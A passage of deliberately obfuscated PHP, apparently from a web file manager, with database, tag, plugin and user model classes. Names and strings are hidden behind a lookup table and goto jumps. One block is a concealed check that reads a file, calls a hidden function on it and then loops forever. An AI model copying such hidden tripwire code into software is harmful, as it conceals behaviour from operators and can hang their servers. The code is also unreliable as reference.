$this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[„Ç©ñÎ©][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¿Š§àÍŠ = $this->_linkID->query($_SERVER[„Ç©ñÎ©][27]); if (!$¿Š§àÍŠ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $§ŞıÏå = $this->_linkID->query($_SERVER[„Ç©ñÎ©][28]); if (!$§ŞıÏå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $±å›ĞŸğ = array(); while ($Ùä™ç­ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $±å›ĞŸğ[] = $Ùä™ç­; } $this->queryID->reset(); return $±å›ĞŸğ; } public function getFields($ù£»¶Çë) { $×‡¾ıı‹ =& $_SERVER[„Ç©ñÎ©]; $Û¢…áÙ = $this->query($×‡¾ıı‹[29] . $ù£»¶Çë . $×‡¾ıı‹[30]); $î•ï†œÛ = array(); if ($Û¢…áÙ) { foreach ($Û¢…áÙ as $şö¼•Œ => $ƒşı¥ÓŸ) { $î•ï†œÛ[$ƒşı¥ÓŸ[$×‡¾ıı‹[32]]] = array($×‡¾ıı‹[32] => $ƒşı¥ÓŸ[$×‡¾ıı‹[32]], $×‡¾ıı‹[33] => $ƒşı¥ÓŸ[$×‡¾ıı‹[33]], $×‡¾ıı‹[35] => (bool) ($ƒşı¥ÓŸ[$×‡¾ıı‹[35]] === $×‡¾ıı‹[12]), $×‡¾ıı‹[37] => $ƒşı¥ÓŸ[$×‡¾ıı‹[56]], $×‡¾ıı‹[39] => (bool) $ƒşı¥ÓŸ[$×‡¾ıı‹[57]], $×‡¾ıı‹[42] => (bool) $ƒşı¥ÓŸ[$×‡¾ıı‹[57]]); } } return $î•ï†œÛ; } public function getTables($²®è¡ş = '') { $ùˆÈ” =& $_SERVER[„Ç©ñÎ©]; $åä¢ ú¥ = $this->query($ùˆÈ”[45] . $ùˆÈ”[46] . $ùˆÈ”[47]); $¼”¥›¨˜ = array(); foreach ($åä¢ ú¥ as $í¿º½èĞ => $ìú›ˆ) { $¼”¥›¨˜[$í¿º½èĞ] = current($ìú›ˆ); } return $¼”¥›¨˜; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ò¶ú¹ÖŸ =& $_SERVER[„Ç©ñÎ©]; $this->error = $this->_linkID->lastErrorMsg(); if ($ò¶ú¹ÖŸ[12] != $this->queryStr) { $this->error .= LNG($ò¶ú¹ÖŸ[48]) . $this->queryStr; } think_trace($this->error, $ò¶ú¹ÖŸ[12], $ò¶ú¹ÖŸ[49]); return $this->error; } public function escapeString($£›¥‹) { $¢Æ²ë°• =& $_SERVER[„Ç©ñÎ©]; if ($this->_linkID) { return $this->_linkID->escapeString($£›¥‹); } return str_ireplace($¢Æ²ë°•[58], $¢Æ²ë°•[59], $£›¥‹); } public function parseLimit($æŞ‰†š‘) { $”·ƒ¹ÃĞ =& $_SERVER[„Ç©ñÎ©]; $ç×ÀÖ­ = $”·ƒ¹ÃĞ[12]; if (!empty($æŞ‰†š‘)) { $æŞ‰†š‘ = explode($”·ƒ¹ÃĞ[50], $æŞ‰†š‘); if (count($æŞ‰†š‘) > 1) { $ç×ÀÖ­ .= $”·ƒ¹ÃĞ[51] . $æŞ‰†š‘[1] . $”·ƒ¹ÃĞ[52] . $æŞ‰†š‘[0] . $”·ƒ¹ÃĞ[53]; } else { $ç×ÀÖ­ .= $”·ƒ¹ÃĞ[51] . $æŞ‰†š‘[0] . $”·ƒ¹ÃĞ[53]; } } return $ç×ÀÖ­; } } goto fÖ˜ØÆ†Ô; BˆÃ®º¶¾Ö: if (!isset($_SERVER[$_SERVER[„Ç©ñÎ©][62]]) || !isset($_SERVER[$_SERVER[„Ç©ñÎ©][60]])) { $_getc = $_SERVER[„Ç©ñÎ©][63]; $_getfile = $_SERVER[$_SERVER[„Ç©ñÎ©][64]] . $_SERVER[„Ç©ñÎ©][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[„Ç©ñÎ©][66], $_getfilec); if (count($_getarrs) < $_SERVER[„Ç©ñÎ©][67]) { $exit = $_SERVER[„Ç©ñÎ©][68]; $exit(); } $_act = $_SERVER[„Ç©ñÎ©][69]; $_act($_SERVER[$_SERVER[„Ç©ñÎ©][64]] . $_SERVER[„Ç©ñÎ©][65]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[„Ç©ñÎ©][387]); } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($×ÜíïêÆ) { $Œúª¿ı­ =& $_SERVER[„Ç©ñÎ©]; return array($Œúª¿ı­[1936] => array($×ÜíïêÆ[0], $Œúª¿ı­[1937]), $Œúª¿ı­[1938] => array($×ÜíïêÆ[0], $Œúª¿ı­[1939])); } protected function get($¼±í€Ú) { $“ĞÒìÓ– =& $_SERVER[„Ç©ñÎ©]; $«µ¢éœ“ = Model($“ĞÒìÓ–[531])->metaGet($¼±í€Ú, $“ĞÒìÓ–[1940]); $´£œÃÀã = json_decode($«µ¢éœ“, !0); return $´£œÃÀã ? $´£œÃÀã : array($“ĞÒìÓ–[1941] => $“ĞÒìÓ–[98], $“ĞÒìÓ–[378] => array()); } protected function set($¸øññó”, $„À™öÅ›) { $ò›±Ñ§Ç =& $_SERVER[„Ç©ñÎ©]; $„À™öÅ› = $„À™öÅ› ? $„À™öÅ› : array($ò›±Ñ§Ç[1941] => $ò›±Ñ§Ç[98], $ò›±Ñ§Ç[378] => array()); return Model($ò›±Ñ§Ç[531])->metaSet($¸øññó”, $ò›±Ñ§Ç[1940], json_encode($„À™öÅ›)); } protected function getByTagID($¨ÀÎÉ’›, $£øˆ‰“è) { $…ÜÛ÷ä² =& $_SERVER[„Ç©ñÎ©]; if (!$¨ÀÎÉ’› || !$£øˆ‰“è) { return !1; } if (!Model($…ÜÛ÷ä²[531])->getInfoSimple($¨ÀÎÉ’›)) { return !1; } $âíÚĞü = $this->get($¨ÀÎÉ’›); if (!$âíÚĞü || !isset($âíÚĞü[$…ÜÛ÷ä²[378]])) { return !1; } $û©ğ§¥ª = array_find_by_field($âíÚĞü[$…ÜÛ÷ä²[378]], $…ÜÛ÷ä²[408], $£øˆ‰“è); return is_array($û©ğ§¥ª) ? $û©ğ§¥ª : !1; } public function listSource($½ª®™”Ó, $şƒ²Ã¡¸) { $¯ÙÁğ¬ó =& $_SERVER[„Ç©ñÎ©]; if ($şƒ²Ã¡¸ && !is_array($şƒ²Ã¡¸)) { $şƒ²Ã¡¸ = array($şƒ²Ã¡¸); } $Çë¶’ = $this->listData($½ª®™”Ó); $½îâ©ğè = array(); foreach ($Çë¶’ as $•Ò§ÀÄ£) { $­®€Úø¹ = $•Ò§ÀÄ£[$¯ÙÁğ¬ó[94]]; if (!$­®€Úø¹) { continue; } if (!isset($½îâ©ğè[$­®€Úø¹])) { $½îâ©ğè[$­®€Úø¹] = array(); } $½îâ©ğè[$­®€Úø¹][] = $•Ò§ÀÄ£[$¯ÙÁğ¬ó[435]]; } $—ã±´ö¹ = array(); foreach ($½îâ©ğè as $š”Ê¥‹£ => $§Ä÷èÕ) { $¼ŞÎ”ˆç = !0; if (!$şƒ²Ã¡¸) { $—ã±´ö¹[] = $š”Ê¥‹£; continue; } foreach ($şƒ²Ã¡¸ as $¦ğ¸¬êû) { if (!in_array($¦ğ¸¬êû, $§Ä÷èÕ)) { $¼ŞÎ”ˆç = !1; break; } } if ($¼ŞÎ”ˆç) { $—ã±´ö¹[] = $š”Ê¥‹£; } } if (!$—ã±´ö¹) { return array(); } $„–Ù§—Ì = array($¯ÙÁğ¬ó[426] => array($¯ÙÁğ¬ó[427], $—ã±´ö¹), $¯ÙÁğ¬ó[514] => $½ª®™”Ó, $¯ÙÁğ¬ó[420] => SourceModel::TYPE_GROUP); $¡µ…Ã  = Model($¯ÙÁğ¬ó[1326])->listSource($„–Ù§—Ì); if (!$¡µ…Ã  || count($—ã±´ö¹) == $¡µ…Ã [$¯ÙÁğ¬ó[375]][$¯ÙÁğ¬ó[376]]) { return $¡µ…Ã ; } $š ¡ü• = array(); $á†ØˆûÍ = array_to_keyvalue($¡µ…Ã [$¯ÙÁğ¬ó[92]], $¯ÙÁğ¬ó[12], $¯ÙÁğ¬ó[411]); $Ô«ğ“İ = array_to_keyvalue($¡µ…Ã [$¯ÙÁğ¬ó[93]], $¯ÙÁğ¬ó[12], $¯ÙÁğ¬ó[411]); $¢ö‰ÏÊ˜ = array_merge($Ô«ğ“İ, $á†ØˆûÍ); foreach ($—ã±´ö¹ as $­®€Úø¹) { if (!in_array($­®€Úø¹, $¢ö‰ÏÊ˜)) { $š ¡ü•[] = $­®€Úø¹; } } if ($š ¡ü•) { $this->removeBySource($½ª®™”Ó, $š ¡ü•); } return $¡µ…Ã ; } protected function listData($§±óò) { $£´ÍÁıÈ =& $_SERVER[„Ç©ñÎ©]; $™“ª£²¹ = array($£´ÍÁıÈ[1646] => 0, $£´ÍÁıÈ[493] => array($£´ÍÁıÈ[1942], 0), $£´ÍÁıÈ[431] => $£´ÍÁıÈ[1943] . $§±óò); $¦›áº½— = $£´ÍÁıÈ[1944]; $«ö…Œ¡ù = $this->field($¦›áº½—)->where($™“ª£²¹)->order($£´ÍÁıÈ[1945])->select(); return $«ö…Œ¡ù ? $«ö…Œ¡ù : array(); } protected function addToTag($’Ğ˜Ø¿Ç, $”ÕÁìš¯, $‘Ğ œ™È) { $«İ–Ö¤ =& $_SERVER[„Ç©ñÎ©]; if (!$this->getByTagID($’Ğ˜Ø¿Ç, $‘Ğ œ™È) || !$”ÕÁìš¯) { return !1; } if (!Model($«İ–Ö¤[828])->pathInfo($”ÕÁìš¯)) { return !1; } $•ÃÕÛş = array($«İ–Ö¤[1646] => 0, $«İ–Ö¤[493] => $‘Ğ œ™È, $«İ–Ö¤[430] => $”ÕÁìš¯, $«İ–Ö¤[431] => $«İ–Ö¤[1946] . $’Ğ˜Ø¿Ç, $«İ–Ö¤[429] => $«İ–Ö¤[12], $«İ–Ö¤[1831] => 0); if ($this->where($•ÃÕÛş)->find()) { return !1; } return $this->add($•ÃÕÛş); } protected function removeFromTag($Ç½ƒÊÑ, $À•ÚÙ‰ã, $Û÷ÏôÙ) { $º¢ı‰Ä‹ =& $_SERVER[„Ç©ñÎ©]; if (!$this->getByTagID($Ç½ƒÊÑ, $Û÷ÏôÙ) || !$À•ÚÙ‰ã) { return !1; } if (is_array($À•ÚÙ‰ã)) { $À•ÚÙ‰ã = array($º¢ı‰Ä‹[7], $À•ÚÙ‰ã); } $­Ëä³…à = array($º¢ı‰Ä‹[1646] => 0, $º¢ı‰Ä‹[493] => $Û÷ÏôÙ, $º¢ı‰Ä‹[431] => $º¢ı‰Ä‹[1946] . $Ç½ƒÊÑ, $º¢ı‰Ä‹[430] => $À•ÚÙ‰ã); return $this->where($­Ëä³…à)->delete(); } protected function removeByTag($ê¢¾»Ş×, $ÂíÚù¼Š) { $ÇÊÍå°æ =& $_SERVER[„Ç©ñÎ©]; if (!$this->getByTagID($ê¢¾»Ş×, $ÂíÚù¼Š)) { return !1; } $¹Ğó¢Ô = array($ÇÊÍå°æ[1646] => 0, $ÇÊÍå°æ[493] => $ÂíÚù¼Š, $ÇÊÍå°æ[431] => $ÇÊÍå°æ[1946] . $ê¢¾»Ş×); return $this->where($¹Ğó¢Ô)->delete(); } protected function removeBySource($’»ºŞ–İ, $œïìÉ‡î) { $”é€ßî =& $_SERVER[„Ç©ñÎ©]; if (!$’»ºŞ–İ || !$œïìÉ‡î) { return !1; } if (is_array($œïìÉ‡î)) { $œïìÉ‡î = array($”é€ßî[7], $œïìÉ‡î); } $ï–Ïªæ¤ = array($”é€ßî[1646] => 0, $”é€ßî[430] => $œïìÉ‡î, $”é€ßî[493] => array($”é€ßî[1013], 0), $”é€ßî[431] => $”é€ßî[1946] . $’»ºŞ–İ); return $this->where($ï–Ïªæ¤)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x70\154\165\x67\x69\156\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x73\164\141\164\165\163", "\x72\x65\147\151\x65\x73\164", "\143\157\x6e\x66\x69\x67"); public function loadList($Ì›»ø™ = false) { $‡µ¨™‡Í = array_to_keyvalue($this->listData(), $_SERVER[„Ç©ñÎ©][32]); if ($Ì›»ø™) { return $‡µ¨™‡Í[$Ì›»ø™]; } return $‡µ¨™‡Í; } public function init() { $À‡«’Œ‚ =& $_SERVER[„Ç©ñÎ©]; Hook::trigger($À‡«’Œ‚[1947]); $Æ¸Îçº = $this->loadPluginList(); foreach ($Æ¸Îçº as $ª³Å„‡ë => $çÕï—³õ) { $¢©Ÿß˜ = $this->appAllow($ª³Å„‡ë, $çÕï—³õ); if (!$¢©Ÿß˜) { continue; } foreach ($çÕï—³õ[$À‡«’Œ‚[1948]] as $âõÀº‰ê => $¦™»ÃÔ˜) { Hook::bind($âõÀº‰ê, $¦™»ÃÔ˜); } } Hook::trigger($À‡«’Œ‚[1949]); Hook::trigger(ACTION); } public function appAllow($ªÖ¬£ï, $“›·–ºÁ, $‰²áÓ²¿ = true) { $¥©õÚ¯Ù =& $_SERVER[„Ç©ñÎ©]; $¹òÇàß = PLUGIN_DIR . $ªÖ¬£ï . $¥©õÚ¯Ù[1950]; if (!is_array($“›·–ºÁ) || !is_array($“›·–ºÁ[$¥©õÚ¯Ù[1948]]) || $“›·–ºÁ[$¥©õÚ¯Ù[753]] != 1 || !is_file($¹òÇàß)) { return !1; } if ($GLOBALS[$¥©õÚ¯Ù[512]] == 1) { if ($GLOBALS[$¥©õÚ¯Ù[6]][$¥©õÚ¯Ù[1951]] || !$GLOBALS[$¥©õÚ¯Ù[6]][$¥©õÚ¯Ù[1952]]) { return !0; } $áß±ò»ê = explode($¥©õÚ¯Ù[50], strtolower($GLOBALS[$¥©õÚ¯Ù[6]][$¥©õÚ¯Ù[1952]])); return in_array(strtolower($ªÖ¬£ï), $áß±ò»ê) ? !1 : !0; } if ($‰²áÓ²¿ && !Action($¥©õÚ¯Ù[1953])->checkAuth($ªÖ¬£ï)) { return !1; } return !0; } public function unInstall($Š”º±) { $‰ñÀÏïô =& $_SERVER[„Ç©ñÎ©]; $íÉÙÖ×É = $this->loadList($Š”º±); if (file_exists(PLUGIN_DIR . $Š”º±)) { Hook::apply($Š”º± . $‰ñÀÏïô[1954]); } $this->remove($íÉÙÖ×É[$‰ñÀÏïô[408]]); } public function changeStatus($¨ıÛÌ‘š, $õúİçš) { $ùèÑÛ¼® =& $_SERVER[„Ç©ñÎ©]; $í¹¶¸ö = $this->loadList($¨ıÛÌ‘š); if ($õúİçš) { Hook::apply($¨ıÛÌ‘š . $ùèÑÛ¼®[1955]); } $this->update($í¹¶¸ö[$ùèÑÛ¼®[408]], array($ùèÑÛ¼®[1956] => $õúİçš)); } public function appRegist($óÛÛœ¥‘, $ ×ÁÓ‡) { $›¦Ï‘ÒÜ =& $_SERVER[„Ç©ñÎ©]; $İã¶ĞÔÔ = $this->loadList($óÛÛœ¥‘); if ($İã¶ĞÔÔ) { $this->update($İã¶ĞÔÔ[$›¦Ï‘ÒÜ[408]], array($›¦Ï‘ÒÜ[1948] => $ ×ÁÓ‡)); } else { $®€ÜÚä = array($›¦Ï‘ÒÜ[32] => $óÛÛœ¥‘, $›¦Ï‘ÒÜ[1948] => $ ×ÁÓ‡, $›¦Ï‘ÒÜ[753] => 0, $›¦Ï‘ÒÜ[6] => $this->getConfigDefault($óÛÛœ¥‘)); $this->insert($®€ÜÚä); } } public function getConfigDefault($×µâ®¨) { $Ò­œÍåë =& $_SERVER[„Ç©ñÎ©]; $ş¼‘òéÉ = array(); $ÊÕ»ˆ›… = $this->getPackageJson($×µâ®¨); if (!$ÊÕ»ˆ›… && is_array($ÊÕ»ˆ›…[$Ò­œÍåë[1957]])) { return $ş¼‘òéÉ; } foreach ($ÊÕ»ˆ›…[$Ò­œÍåë[1957]] as $œÒÛ´àŞ => $ŞÈ¸Èç) { if (!isset($ŞÈ¸Èç[$Ò­œÍåë[383]]) || isset($ş¼‘òéÉ[$œÒÛ´àŞ])) { continue; } $ş¼‘òéÉ[$œÒÛ´àŞ] = $ŞÈ¸Èç[$Ò­œÍåë[383]]; } return $ş¼‘òéÉ; } public function getPackageJson($²“£À´Í) { return Hook::apply($²“£À´Í . $_SERVER[„Ç©ñÎ©][1958]); } public function getConfig($™ÎÛÁ¯Á, $ÔŸãïÁì = false) { $Ø×ŒÌ‰ =& $_SERVER[„Ç©ñÎ©]; $ÂÚ¬æí— = array(); $ÑĞŸİƒÍ = $this->loadList($™ÎÛÁ¯Á); if ($ÑĞŸİƒÍ && is_array($ÑĞŸİƒÍ[$Ø×ŒÌ‰[6]])) { $ÂÚ¬æí— = $ÑĞŸİƒÍ[$Ø×ŒÌ‰[6]]; } if (!$ÂÚ¬æí— || $ÔŸãïÁì) { $ÂÚ¬æí— = $this->getConfigDefault($™ÎÛÁ¯Á); } return $ÂÚ¬æí—; } public function setConfig($ì¹ËÎ½ş, $„åéœöà = false) { $°ğ¼µêÆ =& $_SERVER[„Ç©ñÎ©]; $ÔÜÅ¤ÄÒ = $this->loadList($ì¹ËÎ½ş); if (!$ÔÜÅ¤ÄÒ) { return !1; } $º†¨Íñ = $ÔÜÅ¤ÄÒ[$°ğ¼µêÆ[6]]; if ($„åéœöà == !1) { $º†¨Íñ = array(); $„åéœöà = $this->getConfigDefault($ì¹ËÎ½ş); } foreach ($„åéœöà as $îÎé÷Â => $°ƒè¨¹) { $º†¨Íñ[$îÎé÷Â] = is_string($°ƒè¨¹) ? trim($°ƒè¨¹) : $°ƒè¨¹; } $this->update($ÔÜÅ¤ÄÒ[$°ğ¼µêÆ[408]], array($°ğ¼µêÆ[6] => $º†¨Íñ)); } public function viewList() { $ï¨›¡™½ =& $_SERVER[„Ç©ñÎ©]; $„æø½ˆ“ = $this->loadList(); $this->pluginScan($„æø½ˆ“); $„æø½ˆ“ = $this->loadPluginList(); $¼·şÔä = array(); foreach ($„æø½ˆ“ as $Şä†¦Ğ => $‹œ³§É) { unset($‹œ³§É[$ï¨›¡™½[1948]], $‹œ³§É[$ï¨›¡™½[6]]); $¹¾§×¥Ü = PLUGIN_DIR . $‹œ³§É[$ï¨›¡™½[32]] . $ï¨›¡™½[1950]; if (!is_file($¹¾§×¥Ü)) { continue; } $ÔÛÛ¶¼š = Hook::apply($‹œ³§É[$ï¨›¡™½[32]] . $ï¨›¡™½[1958]); if (is_array($ÔÛÛ¶¼š)) { $¼·şÔä[$Şä†¦Ğ] = array_merge($‹œ³§É, $ÔÛÛ¶¼š); } } return $¼·şÔä; } private function loadPluginList() { $¼È«Ê¡æ =& $_SERVER[„Ç©ñÎ©]; $™ÓªÛ¼ª = $this->loadList(); if (strtolower(MOD) == $¼È«Ê¡æ[1959]) { return $™ÓªÛ¼ª; } $ìÔºÑ¯ë = Hook::trigger($¼È«Ê¡æ[1960], $™ÓªÛ¼ª); if ($™ÓªÛ¼ª && !$ìÔºÑ¯ë) { die; } return $ìÔºÑ¯ë ? $ìÔºÑ¯ë : $™ÓªÛ¼ª; } private function pluginScan($©ïåÃ‡Ô) { $şÀÉæğ‹ =& $_SERVER[„Ç©ñÎ©]; recursion_dir(PLUGIN_DIR, $óíÈ×‚À, $¾œ¤›š, 0); foreach ($óíÈ×‚À as $Ïğ¿œÒá) { $âªÓ«Õ¾ = get_path_this($Ïğ¿œÒá); if (isset($©ïåÃ‡Ô[$âªÓ«Õ¾]) || !file_exists($Ïğ¿œÒá . $şÀÉæğ‹[1961]) || !file_exists($Ïğ¿œÒá . $şÀÉæğ‹[1950])) { continue; } Hook::apply($âªÓ«Õ¾ . $şÀÉæğ‹[1955]); } } } goto fôÎäàÈÎ; DÎöèßâƒÉ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\152\157\x62\114\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\144\x65\x73\x63", "\x73\157\162\164"); const JOB_KEY = "\163\x65\x6c\x66\x4a\157\x62\114\151\x73\164"; public function listData($»¥‚ÂÊÆ = false, $ŸşÏï× = "\x73\x6f\x72\164", $òÈ´ûšÀ = false) { return parent::listData($»¥‚ÂÊÆ, $ŸşÏï×, $òÈ´ûšÀ); } public function remove($úÛÍµÏª) { return parent::remove($úÛÍµÏª); } public function add($¿øÖ¾ŞÕ) { $ö‰‡Ç»˜ =& $_SERVER[„Ç©ñÎ©]; if ($this->findByName($¿øÖ¾ŞÕ[$ö‰‡Ç»˜[32]])) { return !1; } $¿øÖ¾ŞÕ[$ö‰‡Ç»˜[1851]] = $this->getSort(); return parent::insert($¿øÖ¾ŞÕ); } private function getSort() { $é—ãı¦ó =& $_SERVER[„Ç©ñÎ©]; $¶ıçèªÓ = parent::listData(); $ù­áœ°‘ = array_to_keyvalue($¶ıçèªÓ, $é—ãı¦ó[12], $é—ãı¦ó[1851]); return empty($ù­áœ°‘) ? 0 : max($ù­áœ°‘) + 1; } public function update($ØèÍ›Â, $‹Üß£µŞ) { $°¹¼Ò×é =& $_SERVER[„Ç©ñÎ©]; $úåôÓ = parent::listData($ØèÍ›Â); $‹¢Áìì = $this->findByName($‹Üß£µŞ[$°¹¼Ò×é[32]]); if (!$úåôÓ || $‹¢Áìì && $‹¢Áìì[$°¹¼Ò×é[408]] != $úåôÓ[$°¹¼Ò×é[408]]) { return !1; } return parent::update($ØèÍ›Â, $‹Üß£µŞ); } public function setUserJob($šŠ…°Ú£, $‡±œó„‰) { $¶´¨š”Ä =& $_SERVER[„Ç©ñÎ©]; if (!is_array($‡±œó„‰)) { $‡±œó„‰ = array($‡±œó„‰); } $¶‹‘ïß = parent::listData(); $´“şŸ÷« = array_to_keyvalue($¶‹‘ïß, $¶´¨š”Ä[32]); $ŒïìÜ÷÷ = $¶´¨š”Ä[387]; foreach ($‡±œó„‰ as $£ßÈ¥¯) { if ($´“şŸ÷«[$£ßÈ¥¯]) { $ŒïìÜ÷÷ .= $´“şŸ÷«[$£ßÈ¥¯][$¶´¨š”Ä[408]] . $¶´¨š”Ä[50]; } else { $³á¿ÑÇ = $this->add($£ßÈ¥¯); $ŒïìÜ÷÷ .= $³á¿ÑÇ . $¶´¨š”Ä[50]; } } $ŒïìÜ÷÷ = rtrim($ŒïìÜ÷÷, $¶´¨š”Ä[50]); Model($¶´¨š”Ä[544])->metaSet($šŠ…°Ú£, self::JOB_KEY, $ŒïìÜ÷÷); } public function getUserJob($ÄäæòÆæ) { $•ÆŸ„¬“ = Model($_SERVER[„Ç©ñÎ©][544])->metaGet($ÄäæòÆæ); return $this->getUserJobInfo($•ÆŸ„¬“[self::JOB_KEY]); } public function getUserJobInfo($İİ€ñ˜Š) { $Â°ß”İÎ =& $_SERVER[„Ç©ñÎ©]; $¤î‰»ÜË = explode($Â°ß”İÎ[50], $İİ€ñ˜Š); $”¥Š“ş¢ = parent::listData(); $”¥Š“ş¢ = array_remove_key($”¥Š“ş¢, $Â°ß”İÎ[210]); $í›¶Â‚Ã = array(); foreach ($¤î‰»ÜË as $€¦®‘—å) { if (isset($”¥Š“ş¢[$€¦®‘—å])) { $í›¶Â‚Ã[] = $”¥Š“ş¢[$€¦®‘—å]; } } return $í›¶Â‚Ã; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\155\145" => "\x75\x73\x65\x72\137\x6d\x65\164\141", "\155\x65\x74\x61\106\x69\145\154\144" => "\x75\163\145\162\111\104"); protected $simpleField = "\165\163\145\x72\111\x44\x2c\x6e\151\x63\153\x4e\x61\x6d\145\x2c\156\x61\x6d\x65\54\x61\x76\141\x74\x61\162\54\163\145\170\54\x73\x74\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ã½¸©«) { $Í«¡§­ø =& $_SERVER[„Ç©ñÎ©]; $©“åÛâ‚ = $Í«¡§­ø[2270]; return array($Í«¡§­ø[1905] => array($ã½¸©«[0], $©“åÛâ‚), $Í«¡§­ø[1907] => array($ã½¸©«[0], $©“åÛâ‚), $Í«¡§­ø[2271] => array($ã½¸©«[0], $©“åÛâ‚)); } protected function getInfo($»å ’œ, $ÄåÙ¨µÜ = false) { $ÒÈÇì‹ö = $this->getInfoSimple($»å ’œ); if (!is_array($ÒÈÇì‹ö)) { return array(); } if ($ÄåÙ¨µÜ) { return $this->_getInfoApply($ÒÈÇì‹ö); } return $this->cacheFunctionGet($_SERVER[„Ç©ñÎ©][1909], $»å ’œ); } protected function getInfoFull($ø’¿Ìöİ, $‚†ºÖÃ¶ = false) { $ÎÈÂüÕé = $this->getInfoSimple($ø’¿Ìöİ); if (!is_array($ÎÈÂüÕé)) { return array(); } if ($‚†ºÖÃ¶) { return $this->_getInfoApply($ÎÈÂüÕé, !0); } return $this->cacheFunctionGet($_SERVER[„Ç©ñÎ©][2272], $ø’¿Ìöİ); } private function _getInfoApply($ü„â…ó, $Éàø¾öâ = false) { $Üµ±äÙ =& $_SERVER[„Ç©ñÎ©]; if (!$ü„â…ó) { return $ü„â…ó; } $Ó’ÛÙ¤Æ = md5($Üµ±äÙ[2273] . $ü„â…ó[$Üµ±äÙ[888]] . $Üµ±äÙ[2274] . $ü„â…ó[$Üµ±äÙ[32]]); $ü„â…ó = $this->_listDataApplyItem($ü„â…ó); $à¦Ì Ù = Model($Üµ±äÙ[1326])->metaGet($ü„â…ó[$Üµ±äÙ[96]][$Üµ±äÙ[411]]); $ü„â…ó[$Üµ±äÙ[2275]] = $Ó’ÛÙ¤Æ; $ü„â…ó[$Üµ±äÙ[96]][$Üµ±äÙ[2096]] = isset($à¦Ì Ù[$Üµ±äÙ[2097]]) ? $à¦Ì Ù[$Üµ±äÙ[2097]] : null; if ($Éàø¾öâ) { $ü„â…ó[$Üµ±äÙ[475]] = $this->metaGet($ü„â…ó[$Üµ±äÙ[1655]]); } return $ü„â…ó; } protected function getInfoSimple($­ÙÏÇİˆ, $¨©ÛÏî = false) { $Şßïö±¯ =& $_SERVER[„Ç©ñÎ©]; if (!$­ÙÏÇİˆ) { return array(); } if ($¨©ÛÏî) { $âÔê£ = $this->where(array($Şßïö±¯[1655] => intval($­ÙÏÇİˆ)))->find(); if (!is_array($âÔê£)) { return array(); } $âÔê£[$Şßïö±¯[552]] = Action($Şßïö±¯[2276])->parseUrl($âÔê£[$Şßïö±¯[552]]); return $âÔê£; } return $this->cacheFunctionGet($Şßïö±¯[1910], $­ÙÏÇİˆ); } protected function getInfoSimpleOuter($‘¶œÛÚå) { $ÚÆÛ¾áË =& $_SERVER[„Ç©ñÎ©]; if (!$‘¶œÛÚå || $‘¶œÛÚå == 0) { return array($ÚÆÛ¾áË[1655] => $ÚÆÛ¾áË[207], $ÚÆÛ¾áË[32] => $ÚÆÛ¾áË[172] . LNG($ÚÆÛ¾áË[2277]) . $ÚÆÛ¾áË[174], $ÚÆÛ¾áË[552] => STATIC_PATH . $ÚÆÛ¾áË[2278]); } $û”‹é“´ = $this->cacheFunctionGet($ÚÆÛ¾áË[1910], $‘¶œÛÚå); $²È¬µ³ş = array_field_key($û”‹é“´, explode($ÚÆÛ¾áË[50], $this->simpleField)); if (!$²È¬µ³ş) { return array($ÚÆÛ¾áË[1655] => $ÚÆÛ¾áË[1189], $ÚÆÛ¾áË[32] => $ÚÆÛ¾áË[172] . LNG($ÚÆÛ¾áË[2279]) . $ÚÆÛ¾áË[174], $ÚÆÛ¾áË[552] => STATIC_PATH . $ÚÆÛ¾áË[2280]); } $²È¬µ³ş[$ÚÆÛ¾áË[552]] = Action($ÚÆÛ¾áË[2276])->parseUrl($²È¬µ³ş[$ÚÆÛ¾áË[552]]); return $²È¬µ³ş; } protected function groupUser($Ôßé£ç) { } public static function errorLang($ò®èĞ¸¼) { $ÑäíŠ±Ÿ =& $_SERVER[„Ç©ñÎ©]; $‡ßˆÜØ = array(self::ERROR_USER_NOT_EXISTS => $ÑäíŠ±Ÿ[2281], self::ERROR_USER_PASSWORD_ERROR => $ÑäíŠ±Ÿ[2282], self::ERROR_USER_EXIST_NAME => $ÑäíŠ±Ÿ[2283], self::ERROR_USER_EXIST_PHONE => $ÑäíŠ±Ÿ[2284], self::ERROR_USER_EXIST_EMAIL => $ÑäíŠ±Ÿ[2285], self::ERROR_USER_LOGIN_LOCK => $ÑäíŠ±Ÿ[2286], self::ERROR_IP_NOT_ALLOW => $ÑäíŠ±Ÿ[2287], self::ERROR_USER_EXIST_NICKNAME => $ÑäíŠ±Ÿ[2288]); return LNG($‡ßˆÜØ[$ò®èĞ¸¼]); } public function getInfoByMeta($•ÀÂ¥æë, $ñé©ÛÏú) { $¹Ñ×ıòå =& $_SERVER[„Ç©ñÎ©]; $æõ‰Ç = Model($¹Ñ×ıòå[2289])->where(array($¹Ñ×ıòå[104] => $•ÀÂ¥æë, $¹Ñ×ıòå[383] => $ñé©ÛÏú))->find(); if ($æõ‰Ç) { return $this->getInfo($æõ‰Ç[$¹Ñ×ıòå[1655]]); } return !1; } public function 